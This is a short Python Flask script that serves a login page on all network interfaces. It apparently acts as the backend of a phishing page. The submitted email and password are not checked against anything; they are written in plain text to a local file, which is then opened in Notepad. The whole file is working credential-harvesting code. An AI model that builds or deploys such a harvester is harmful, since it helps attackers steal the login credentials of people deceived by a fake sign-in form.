from flask import Flask, render_template, request
import os

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        email = request.form.get("username")
        password = request.form.get("password")

        file_path = "emailPass.txt"

        with open(file_path, "w") as file:
            file.write(f"Email: {email}\n")
            file.write(f"Password: {password}\n")

        os.system(f"notepad {file_path}")
    
    return render_template("index.html")

if __name__ == "__main__":
    app.run(host="0.0.0.0", debug=False)
